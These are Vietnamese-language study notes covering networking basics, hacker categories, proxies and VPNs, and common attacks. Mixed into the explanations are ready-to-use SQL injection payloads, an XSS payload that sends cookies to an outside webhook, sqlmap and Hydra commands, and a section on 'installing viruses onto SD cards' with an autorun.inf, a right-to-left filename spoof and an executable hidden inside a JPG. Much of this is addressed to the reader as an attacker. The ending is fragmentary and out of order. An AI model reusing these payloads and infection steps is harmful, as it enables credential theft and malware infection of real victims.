TCP (Transmission Control Protocol)

Là giao thức truyền dữ liệu TIN CẬY, đảm bảo dữ liệu đến đúng và đủ.

CÁCH HOẠT ĐỘNG:
Giống như gửi thư bảo đảm qua bưu điện. Người nhận phải ký xác nhận đã nhận.

QUY TRÌNH "BẮT TAY 3 BƯỚC" (Three-Way Handshake):
1. Client gửi: SYN (Tôi muốn kết nối)
2. Server trả lời: SYN-ACK (Tôi sẵn sàng, bạn sẵn sàng chưa?)
3. Client gửi: ACK (Tôi sẵn sàng, bắt đầu truyền dữ liệu)

VÍ DỤ THỰC TẾ:
- Tải file: File phải tải đầy đủ, không được thiếu
- Gửi email: Email phải đến đúng người nhận
- Xem web HTTP/HTTPS: Trang web phải hiển thị đầy đủ

ĐẶC ĐIỂM:
- Chậm hơn UDP (vì phải kiểm tra)
- Đảm bảo dữ liệu đến đúng thứ tự
- Tự động gửi lại nếu mất gói tin
- Dùng cho web (HTTP), email (SMTP), file (FTP)

UDP (User Datagram Protocol)

Là giao thức truyền dữ liệu KHÔNG TIN CẬY, nhanh nhưng không đảm bảo.

CÁCH HOẠT ĐỘNG:
Giống như ném máy bay giấy qua cửa sổ. Có thể đến, có thể không, không cần xác nhận.

KHÔNG CÓ "BẮT TAY":
Client cứ gửi dữ liệu đi, không cần server xác nhận.

VÍ DỤ THỰC TẾ:
- Xem video trực tuyến (YouTube, TikTok): Mất vài khung hình cũng không sao
- Gọi điện thoại qua mạng (VoIP, Zalo, Messenger): Ưu tiên thời gian thực
- Chơi game online: Cần tốc độ nhanh, mất vài gói tin không quan trọng
- DNS query: Tra cứu tên miền

ĐẶC ĐIỂM:
- Nhanh hơn TCP (không kiểm tra)
- Không đảm bảo dữ liệu đến đúng thứ tự
- Không gửi lại nếu mất gói tin
- Dùng cho video call, game, livestream, DNS

DNS (Domain Name System)

LÀ GÌ?
DNS là "danh bạ điện thoại" của internet. Đổi tên miền (google.com) thành địa chỉ IP (142.250.186.46).

CÁCH HOẠT ĐỘNG:
1. Bạn gõ: google.com
2. Máy hỏi DNS server: "google.com ở đâu?"
3. DNS trả lời: "Địa chỉ IP là 142.250.186.46"
4. Máy kết nối đến IP đó

CÁC LOẠI BẢN GHI DNS:
A Record: Tên miền -> IPv4 (google.com -> 142.250.186.46)
AAAA Record: Tên miền -> IPv6
CNAME Record: Bí danh (www.google.com -> google.com)
MX Record: Mail server (dùng cho email)
NS Record: DNS server quản lý tên miền đó
TXT Record: Văn bản tùy chọn (dùng xác minh domain)

DNS HOẠT ĐỘNG QUA UDP PORT 53.
Khi dữ liệu DNS quá lớn (>512 bytes) thì dùng TCP.

TẤN CÔNG DNS PHỔ BIẾN:
1. DNS Spoofing/Poisoning: Đầu độc DNS, chuyển hướng google.com -> trang giả
2. DNS Hijacking: Chiếm quyền DNS, đổi toàn bộ bản ghi
3. DNS Tunneling: Dùng DNS để truyền dữ liệu lén (vượt firewall)
4. DNS Amplification DDoS: Lợi dụng DNS để khuếch đại tấn công DDoS

HTTP (HyperText Transfer Protocol)

LÀ GÌ?
Giao thức truyền tải trang web. Là cách browser nói chuyện với server.

HOẠT ĐỘNG QUA TCP PORT 80.

REQUEST (Browser -> Server):
GET /trang-chu HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0
Accept: text/html

RESPONSE (Server -> Browser):
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 1234

...nội dung trang web...

PHƯƠNG THỨC HTTP:
GET: Lấy dữ liệu (xem trang web)
POST: Gửi dữ liệu (đăng nhập, form)
PUT: Cập nhật toàn bộ
PATCH: Cập nhật một phần
DELETE: Xóa

HTTP KHÔNG MÃ HÓA -> Dữ liệu gửi dưới dạng văn bản thô -> Ai bắt được đều đọc được!

HTTPS (HTTP Secure)

LÀ GÌ?
HTTP có mã hóa SSL/TLS. Dữ liệu bị mã hóa, không ai đọc được.

HOẠT ĐỘNG QUA TCP PORT 443.

CÁCH HOẠT ĐỘNG (TÓM TẮT):
1. Browser yêu cầu kết nối an toàn
2. Server gửi chứng chỉ SSL (khóa công khai)
3. Browser kiểm tra chứng chỉ (có hợp lệ không?)
4. Browser tạo khóa bí mật, mã hóa bằng khóa công khai của server
5. Server giải mã bằng khóa riêng -> Cả hai có chung khóa bí mật
6. Mọi dữ liệu sau đó đều được mã hóa bằng khóa bí mật này

LỢI ÍCH HTTPS:
- Mã hóa: Không ai đọc được dữ liệu
- Xác thực: Đảm bảo bạn đang nói chuyện với đúng server (không phải giả mạo)
- Toàn vẹn: Dữ liệu không bị thay đổi trên đường truyền

NHẬN BIẾT: Có biểu tượng ổ khóa xanh trên browser.

TẤN CÔNG HTTPS:
1. SSL Strip: Ép kết nối HTTPS -> HTTP (bỏ mã hóa)
2. Man-in-the-Middle với chứng chỉ giả
3. Khai thác lỗ hổng SSL/TLS cũ (Heartbleed, POODLE)

MŨ ĐEN (Black Hat)

Người xấu, hack vì tiền, phá hoại.
Cách hoạt động:
1. Trinh sát: Thu thập thông tin mục tiêu
2. Quét: Nmap, Nessus tìm lỗ hổng
3. Khai thác: Dùng Metasploit, SQLMap
4. Hậu khai thác: Cài backdoor, đánh cắp dữ liệu
5. Xóa log, ẩn dấu vết, bán dữ liệu trên dark web

Công cụ: Metasploit, Cobalt Strike, Mimikatz, Empire, Burp Suite

MŨ TRẮNG (White Hat)

Người tốt, bảo vệ hệ thống.
Cách hoạt động:
1. Lập kế hoạch: Ký hợp đồng, xác định phạm vi
2. Trinh sát: Thu thập thông tin CÓ PHÉP
3. Quét và liệt kê: Tìm lỗ hổng, ghi chép
4. Khai thác có kiểm soát: Chỉ lấy PoC, không gây hại
5. Báo cáo: Viết report, đánh giá CVSS, đề xuất sửa lỗi

Chứng chỉ: CEH, OSCP, CISSP, GPEN

MŨ XÁM (Grey Hat)

Ở giữa, xâm nhập không xin phép nhưng không gây hại.
Thường tìm lỗ hổng tình cờ rồi báo cho chủ hệ thống.
Có thể yêu cầu tiền thưởng. Nếu bị từ chối, công khai sau 90 ngày.
Rủi ro pháp lý cao vì xâm nhập trái phép.

MŨ XANH DƯƠNG (Blue Hat)

Chuyên gia bảo mật được Microsoft thuê.
Tìm lỗ hổng trong sản phẩm Microsoft.
Nhận thưởng lên đến $250,000.

MŨ ĐỎ (Red Hat)

Tự ý vô hiệu hóa hacker xấu. Ranh giới pháp lý rất mong manh.

PROXY LÀ GÌ?

Bạn nhờ thằng bạn chuyển thư giúp -> Thằng bạn = Proxy!
Bạn ---> Proxy ---> Internet (ẩn IP thật)
HTTP Proxy: Chỉ cho web
SOCKS5 Proxy: Cho mọi thứ
Elite Proxy: Ẩn hoàn toàn

VPN LÀ GÌ?

Mặc đồng phục trường khác để vào thư viện -> Đồng phục = VPN!
Bạn ---> [Đường hầm mã hóa] ---> Internet (không ai đọc được)
Proxy: Không mã hóa, nhanh, rẻ
VPN: Có mã hóa, chậm hơn, an toàn hơn

CÁCH CÀI ĐẶT TRÊN IPHONE:

VPN: Cài đặt -> Chung -> VPN -> Thêm cấu hình VPN
App VPN miễn phí: ProtonVPN, Windscribe, TunnelBear
Proxy: Cài đặt -> Wi-Fi -> Chọn mạng -> HTTP Proxy -> Thủ công -> Nhập IP và Port

1. DDoS - Đánh sập website

1000 người chen vào 1 cửa hàng nhỏ -> Không ai vào được.
Gửi hàng triệu request/giây -> Server quá tải -> Sập.
Công cụ: LOIC, HOIC, Slowloris, hping3

2. SQL Injection - Đánh cắp database

Nhập code SQL thay vì username.
Payload: ' OR '1'='1' --
         ' UNION SELECT username,password FROM users --
Công cụ: sqlmap -u "URL" --dbs

3. XSS - Chèn JavaScript

Payload: script alert('XSS') /script
Đánh cắp cookie: script fetch('https://webhook.site/ID?c='+document.cookie) /script
Các loại: Stored XSS, Reflected XSS, DOM-based XSS

4. Phishing - Lừa đảo giả mạo

Tạo trang web giả mạo giống thật. Gửi link cho nạn nhân.
Họ đăng nhập -> Bạn có mật khẩu.
Dấu hiệu: URL lạ, email sai chính tả, yêu cầu gấp.

5. Brute Force - Dò mật khẩu

Thử tất cả mật khẩu có thể.
Công cụ: Hydra, John the Ripper, Hashcat.
hydra -l admin -P pass.txt target.com http-post-form

6. MITM - Tấn công trung gian

Đứng giữa nạn nhân và internet, đọc trộm và thay đổi dữ liệu.
Công cụ: BetterCAP, Ettercap, arpspoof.

7. Ransomware - Mã hóa đòi tiền chuộc

Mã hóa toàn bộ file nạn nhân. Đòi tiền chuộc bằng Bitcoin.
Ví dụ: WannaCry, LockBit, CryptoLocker.

8. Social Engineering - Lừa đảo tâm lý

Lừa con người, không phải hệ thống.
Giả làm nhân viên IT gọi điện, giả làm sếp nhắn tin.
Con người là mắt xích yếu nhất.

Cách cài virus vào thẻ SD:

1. AUTORUN VIRUS:
Tạo file autorun.inf với nội dung:
[AutoRun]
open=virus.exe
-> Khi cắm vào máy, Windows tự chạy virus.exe

2. GIẢ MẠO ĐUÔI FILE:
Dùng ký tự Unicode U+202E để đảo ngược tên file.
"photo.jpg[U+202E]exe.scr" -> Windows hiển thị "photo.scr.jpg"
Thực chất là file .scr (executable)!

3. SHORTCUT VIRUS:
Tạo shortcut đến virus.bat. Đổi icon thành icon ảnh/thư mục.
Nạn nhân click mở -> Virus chạy ngầm + ảnh thật mở ra đánh lừa.

4. PAYLOAD TRONG FILE ẢNH:
copy /b cat.jpg + virus.exe secret.jpg
File secret.jpg vẫn mở được như ảnh bình thường.
Bên trong chứa virus.exe.

5. ANDROID MALWARE QUA THẺ SD:
Copy file virus.apk vào thẻ SD với tên hấp dẫn.
"Game_hay.apk", "Mod_YouTube.apk"
Nạn nhân cài đặt -> Điện thoại bị nhiễm.

PHÒNG CHỐNG:
- Không cắm thẻ SD lạ vào máy
- Tắt AutoRun/AutoPlay trong Windows
- Quét virus trước khi mở
- Format thẻ SD lạ trước khi dùng

AI là gì?

Dạy 1 đứa trẻ phân biệt chó và mèo.
Cho nó xem 10,000 ảnh chó + 10,000 ảnh mèo.
Sau đó nó tự nhận biết được -> Đó là cách AI học!

CÁC LOẠI AI:
1. AI Hẹp (Narrow AI - ANI): Chỉ giỏi 1 việc (ChatGPT, Siri)
2. AI Tổng Quát (AGI): Ngang con người -> CHƯA TỒN TẠI
3. AI Siêu Việt (ASI): Thông minh hơn nhân loại -> CHƯA TỒN TẠI

Machine Learning hoạt động:

1. Thu thập dữ liệu (1 triệu ảnh, toàn bộ Wikipedia)
2. Gán nhãn (ảnh 1: Chó, ảnh 2: Mèo...)
3. Huấn luyện: AI đoán -> Sai -> Điều chỉnh -> Lặp lại
4. Kiểm tra: AI xem ảnh MỚI -> Đoán đúng >95% -> Thành công

AI dùng để hack:

1. Tạo phishing email siêu thật (ChatGPT)
2. Crack mật khẩu nhanh hơn (AI + Hashcat)
3. Deepfake giọng nói/video (lừa chuyển tiền)
4. Tự động tìm lỗ hổng (CodeQL, AI + SAST)
5. Bypass CAPTCHA (nhận diện ảnh >99%)
6. Social Engineering AI (chatbot gọi điện lừa đảo 24/7)

File .TXT

Văn bản thuần, ghi chú, log, code.
Hack: Giả mạo đuôi file (virus.txt.exe), nhúng script độc.

File .PDF

Tài liệu không thay đổi định dạng.
Hack: Nhúng JavaScript độc, exploit lỗ hổng Adobe Reader, PDF phishing.
Phòng: Tắt JavaScript, dùng SumatraPDF.

File .ZIP / .RAR

Nén nhiều file thành 1, giảm dung lượng.
Hack: ZIP BOMB (42KB -> 4.5PB), ZIP Slip Attack, brute force mật khẩu.

File .APK (Android)

File cài ứng dụng Android.

8. Adware: Hiển thị quảng cáo
9. Rootkit: Ẩn mình, chiếm quyền root
